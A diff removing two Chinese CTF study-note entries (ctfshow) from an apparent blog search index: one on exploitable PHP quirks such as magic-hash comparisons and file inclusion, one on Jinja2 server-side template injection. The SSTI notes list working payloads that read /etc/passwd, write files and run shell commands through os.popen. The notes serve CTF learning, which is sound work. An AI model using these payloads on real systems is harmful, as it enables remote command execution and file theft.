@@ -110,349 +110,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php特性</title>
-    <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
-    <content><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="1-intval函数"><a href="#1-intval函数" class="headerlink" title="1.intval函数:"></a>1.intval函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题"><a href="#2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题" class="headerlink" title="2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题"></a>2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题</h3><h4 id="1-对于-不在意数据类型的情况"><a href="#1-对于-不在意数据类型的情况" class="headerlink" title="1.对于&#x3D;&#x3D;不在意数据类型的情况:"></a>1.对于&#x3D;&#x3D;不在意数据类型的情况:</h4><figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">在php中，变量都是弱类型的（就是不指定特定数据类型的），使用<span class="keyword">if</span>判等的时候要格外小心，使用特殊的参数可能会使本来不相等的<span class="keyword">if</span>判断位相等 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---传入a=s1885207154a，b=s1836677006a二者md5都是<span class="number">0</span>e开头，在php中<span class="number">0</span>e会被当做科学计数法，就算后面有字母，其结果也是<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">全字母原值:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">全数字原值:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">以下值在sha1加密后以<span class="number">0</span>E开头：</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>2.对于&#x3D;&#x3D;&#x3D;</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>
-
-<h3 id="3-in-array-函数"><a href="#3-in-array-函数" class="headerlink" title="3.in_array()函数:"></a>3.in_array()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line">    --如果没有使用第三个值strict，那么needle如果为<span class="number">1</span>.php 则也会成功匹配</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-Reflectionclass类"><a href="#4-Reflectionclass类" class="headerlink" title="4.Reflectionclass类:"></a>4.Reflectionclass类:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用 ReflectionClass，可以获取类的属性、方法、常量、父类、接口等信息，也可以动态地调用类的构造函数或方法等</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; 可以得到所有MyClass类的全部信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-hex2bin函数"><a href="#5-hex2bin函数" class="headerlink" title="5.hex2bin函数:"></a>5.hex2bin函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">赋值符号=优先级高于<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---转换十六进制字符串为二进制字符串</span><br><span class="line">is_numeric函数:   如果传入的参数只有一个e字母，则返回<span class="literal">true</span>---科学计数法，全是数字<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --这个命令通过base64，在bin2hex后，输出只有一个e的数字</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-ereg-函数-PHP-7-中被移除"><a href="#6-ereg-函数-PHP-7-中被移除" class="headerlink" title="6.ereg()函数(PHP 7 中被移除)"></a>6.ereg()函数(PHP 7 中被移除)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ereg函数存在<span class="literal">NULL</span>截断漏洞，导致了正则过滤被绕过,所以可以使用%<span class="number">00</span>截断正则匹配</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-Exception类"><a href="#7-Exception类" class="headerlink" title="7.Exception类"></a>7.Exception类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>是所有用户级异常的基类</span><br><span class="line">                             --第一个参数，会把返回值当作错误信息输出</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-FilesystemIterator文件系统迭代器"><a href="#8-FilesystemIterator文件系统迭代器" class="headerlink" title="8.FilesystemIterator文件系统迭代器"></a>8.FilesystemIterator文件系统迭代器</h3> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 是 PHP 中基于 SPL（Standard PHP Library）的一个迭代器类，用来遍历文件系统。</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---两种访问当前目录的方法</span><br></pre></td></tr></table></figure>
-
-<h3 id="9-全局数组-GLOBALS"><a href="#9-全局数组-GLOBALS" class="headerlink" title="9. 全局数组$GLOBALS"></a>9. 全局数组$GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">全局数组<span class="variable">$GLOBALS</span>：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --输出全部信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="10-proc-self-root"><a href="#10-proc-self-root" class="headerlink" title="10.&#x2F;proc&#x2F;self&#x2F;root"></a>10.&#x2F;proc&#x2F;self&#x2F;root</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root 是 Linux 系统中一个特殊的符号链接，它始终指向当前进程的根目录。</span><br></pre></td></tr></table></figure>
-
-<h3 id="11-post传参"><a href="#11-post传参" class="headerlink" title="11.post传参"></a>11.post传参</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">特性<span class="number">1</span>：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _</span><br><span class="line">特性<span class="number">2</span>：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换  ---php8以前</span><br></pre></td></tr></table></figure>
-
-<h3 id="12-传参时"><a href="#12-传参时" class="headerlink" title="12.传参时"></a>12.传参时</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --绕过关键字</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --文件包含</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="13-eval函数与assert函数"><a href="#13-eval函数与assert函数" class="headerlink" title="13.eval函数与assert函数"></a>13.eval函数与assert函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都用于执行php函数 </span><br></pre></td></tr></table></figure>
-
-<h3 id="14-SERVER-‘argv’"><a href="#14-SERVER-‘argv’" class="headerlink" title="14.$_SERVER[‘argv’]"></a>14.$_SERVER[‘argv’]</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] 就等于 <span class="variable">$_SERVER</span>[‘QUERY_STRING’]，<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 就是查询 (query) 的字符串</span><br><span class="line">                                    ---URL中 ? 号后面的原始参数字符串（不解析，不解码，直接拿原样的 query <span class="keyword">string</span>）。</span><br><span class="line">                                    ---需要php.ini 开启了register_argc_argv 配置项。</span><br></pre></td></tr></table></figure>
-
-<h3 id="15-extract函数"><a href="#15-extract函数" class="headerlink" title="15.extract函数"></a>15.extract函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">从数组中将变量导入到当前的符号表</span><br><span class="line">一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</span><br><span class="line">    ---只需要键值对就行了?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,这样也会解析              </span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="16-gettext拓展"><a href="#16-gettext拓展" class="headerlink" title="16.gettext拓展:"></a>16.gettext拓展:</h3><figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()等价于_()</span><br><span class="line">      --使用gettext()相当于echo </span><br></pre></td></tr></table></figure>
-
-<h3 id="17-stripos-函数"><a href="#17-stripos-函数" class="headerlink" title="17.stripos()函数:"></a>17.stripos()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">        --配合目录穿越使用../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="18-正则表达式溢出"><a href="#18-正则表达式溢出" class="headerlink" title="18.正则表达式溢出:"></a>18.正则表达式溢出:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则(pcre)最大回溯/递归限制</span><br><span class="line">    在使用.*?ctfshow非贪婪模式时--匹配到了ctfshow，但是如果ctfshow前面有<span class="number">10</span>万个字符，那么正则会返回<span class="literal">false</span></span><br><span class="line">        --使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</span><br><span class="line">        --默认的backtrack_limit是<span class="number">100000</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="19-php运算符优先级"><a href="#19-php运算符优先级" class="headerlink" title="19.php运算符优先级"></a>19.php运算符优先级</h3><table>
-<thead>
-<tr>
-<th>优先级</th>
-<th>运算符</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td><code>()</code></td>
-<td>括号（表达式分组）</td>
-<td>&#96;($a &amp;&amp; $b)</td>
-</tr>
-<tr>
-<td>2</td>
-<td><code>!</code></td>
-<td>逻辑非</td>
-<td><code>!$a</code></td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>* / %</code></td>
-<td>乘 &#x2F; 除 &#x2F; 取模</td>
-<td><code>$a * $b</code>, <code>$a % $b</code></td>
-</tr>
-<tr>
-<td>4</td>
-<td><code>+ -</code></td>
-<td>加 &#x2F; 减</td>
-<td><code>$a + $b</code></td>
-</tr>
-<tr>
-<td>5</td>
-<td><code>.</code></td>
-<td>字符串连接</td>
-<td><code>$a . $b</code></td>
-</tr>
-<tr>
-<td>6</td>
-<td><code>&lt; &gt; &lt;= &gt;=</code></td>
-<td>比较大小</td>
-<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
-</tr>
-<tr>
-<td>7</td>
-<td><code>== != === !==</code></td>
-<td>相等 &#x2F; 不等 &#x2F; 全等等</td>
-<td><code>$a === $b</code>, <code>$a != $b</code></td>
-</tr>
-<tr>
-<td>8</td>
-<td><code>&amp;</code></td>
-<td>按位与</td>
-<td><code>$a &amp; $b</code></td>
-</tr>
-<tr>
-<td>9</td>
-<td><code>^</code></td>
-<td>按位异或</td>
-<td><code>$a ^ $b</code></td>
-</tr>
-<tr>
-<td>10</td>
-<td>&#96;</td>
-<td>&#96;</td>
-<td>按位或</td>
-</tr>
-<tr>
-<td>11</td>
-<td><code>&amp;&amp;</code></td>
-<td>逻辑与（短路）</td>
-<td><code>$a &amp;&amp; $b</code></td>
-</tr>
-<tr>
-<td>12</td>
-<td>&#96;</td>
-<td></td>
-<td>&#96;</td>
-</tr>
-<tr>
-<td>13</td>
-<td><code>?:</code></td>
-<td>三元运算（条件表达式）</td>
-<td><code>$a ? $b : $c</code></td>
-</tr>
-<tr>
-<td>14</td>
-<td><code>=</code> <code>+=</code> <code>-=</code> 等</td>
-<td>赋值及复合赋值</td>
-<td><code>$a = $b</code>, <code>$a += 1</code></td>
-</tr>
-<tr>
-<td>15</td>
-<td><code>and</code></td>
-<td>逻辑与（低优先）</td>
-<td><code>$a = true and false</code></td>
-</tr>
-<tr>
-<td>16</td>
-<td><code>or</code></td>
-<td>逻辑或（最低优先）</td>
-<td><code>$a = false or true</code></td>
-</tr>
-</tbody></table>
-<h3 id="20-parse-str-函数"><a href="#20-parse-str-函数" class="headerlink" title="20.parse_str()函数:"></a>20.parse_str()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">如果 <span class="keyword">string</span> 是 URL 传递入的查询字符串（query <span class="keyword">string</span>），</span><br><span class="line">则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP <span class="number">7.2</span> 中将废弃不设置参数的行为。</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> 起，result 参数是强制的。</span><br><span class="line">对于<span class="title function_ invoke__">parse_str</span>()，如果传入的是一个数组，例如arr[]=<span class="number">1</span>，则会将变量保存在数组当中arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="21-类"><a href="#21-类" class="headerlink" title="21.类"></a>21.类</h3><h4 id="1-非静态方法-无static"><a href="#1-非静态方法-无static" class="headerlink" title="1.非静态方法(无static)"></a>1.非静态方法(无static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直接<span class="keyword">new</span>一个对象，通过对象来进行调用</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-静态方法-static"><a href="#2-静态方法-static" class="headerlink" title="2.静态方法(static)"></a>2.静态方法(static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">静态方法在类ctfshow，限制了不能去<span class="keyword">new</span>，直接::调用即可</span><br></pre></td></tr></table></figure>
-
-<h3 id="22-call-user-func-函数与call-user-func-array-函数类似"><a href="#22-call-user-func-函数与call-user-func-array-函数类似" class="headerlink" title="22.call_user_func()函数与call_user_func_array()函数类似:"></a>22.call_user_func()函数与call_user_func_array()函数类似:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"> --如果传递一个数组，对于类来说，会把数组的第一个元素当作类名，第二个元素当作类的函数</span><br></pre></td></tr></table></figure>
-
-<h3 id="23-PHP-弱类型特性"><a href="#23-PHP-弱类型特性" class="headerlink" title="23.PHP 弱类型特性(&#x3D;&#x3D;)"></a>23.PHP 弱类型特性(&#x3D;&#x3D;)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP 弱比较 == 的转换规则：</span><br><span class="line">   如果一边是数字，另一边是字符串，PHP 会尝试把字符串转换为数字！  </span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>比较类型</th>
-<th>PHP行为</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>数字 vs 字符串</td>
-<td>字符串会被<strong>强制转换为数字</strong>再比较</td>
-</tr>
-<tr>
-<td>字符串 vs 字符串（若一方看起来像数字）</td>
-<td>会尝试<strong>两边都转成数字</strong>再比较</td>
-</tr>
-<tr>
-<td>布尔 vs 任意类型</td>
-<td>会都转成布尔值再比较</td>
-</tr>
-<tr>
-<td>数组&#x2F;对象 vs 标量</td>
-<td>一律为 <code>false</code></td>
-</tr>
-</tbody></table>
-<h3 id="24-create-function-函数"><a href="#24-create-function-函数" class="headerlink" title="24.create_function()函数:"></a>24.create_function()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ssti</title>
-    <url>/2025/06/02/ctfshow/ssti/</url>
-    <content><![CDATA[<h1 id="常见检测"><a href="#常见检测" class="headerlink" title="常见检测:"></a>常见检测:</h1><table>
-<thead>
-<tr>
-<th>语言</th>
-<th>模板引擎</th>
-<th>示例 Payload</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Python</td>
-<td>Jinja2</td>
-<td><code>&#123;&#123;7*7&#125;&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>Python</td>
-<td>Mako</td>
-<td><code>$&#123;7*7&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>PHP</td>
-<td>Smarty</td>
-<td><code>&#123;$smarty.version&#125;</code></td>
-</tr>
-<tr>
-<td>Java</td>
-<td>FreeMarker</td>
-<td><code>$&#123;7*7&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>Java</td>
-<td>Velocity</td>
-<td><code>#set($x=7*7) $x</code></td>
-</tr>
-<tr>
-<td>Node.js</td>
-<td>EJS</td>
-<td><code>&lt;%= 7*7 %&gt;</code></td>
-</tr>
-</tbody></table>
-<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250527155737650.png" alt="image-20250527155737650"></p>
-<h1 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块:"></a>各个模块:</h1><h2 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2:"></a>1.jinja2:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line">查看所有模块:</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-Python-2-7"><a href="#1-Python-2-7" class="headerlink" title="1. Python 2.7"></a>1. Python 2.7</h3><h4 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到 file 类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：通过 func_globals.linecache.os 执行系统命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法2：通过 __builtins__ 中的 eval 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法3：属性式调用 eval</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法4：调用 __import__ 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法5：索引方式调用 __import__</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="2-Python-3-7"><a href="#2-Python-3-7" class="headerlink" title="2. Python 3.7"></a>2. Python 3.7</h3><h4 id="1-获取基类-1"><a href="#1-获取基类-1" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="2-文件操作-1"><a href="#2-文件操作-1" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再调用 open 读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="3-命令执行-1"><a href="#3-命令执行-1" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再用 eval 调用 os.popen 执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 也可尝试 popen 直接调用（仅当 popen 未被删减）</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#无下划线版</span><br><span class="line">&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-各种过滤"><a href="#3-各种过滤" class="headerlink" title="3.各种过滤:"></a>3.各种过滤:</h3><h4 id="1-绕过过滤"><a href="#1-绕过过滤" class="headerlink" title="1.绕过过滤:"></a>1.<code>&#123;%%&#125;</code>绕过过滤<code>&#123;&#123;&#125;&#125;</code>:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试&#123;%%&#125;，想回显内容在外面加个print就行</span><br><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-getitem-绕过-过滤："><a href="#2-getitem-绕过-过滤：" class="headerlink" title="2.getitem()绕过[]过滤："></a>2.getitem()绕过[]过滤：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</span><br><span class="line">原本是[117]，中括号被ban就用</span><br><span class="line">__getitem__(117)代替[117]</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-request方法绕过引号："><a href="#3-request方法绕过引号：" class="headerlink" title="3.request方法绕过引号："></a>3.request方法绕过引号：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。</span><br><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe</title>
-    <url>/2025/06/02/ctfshow/xxe/</url>
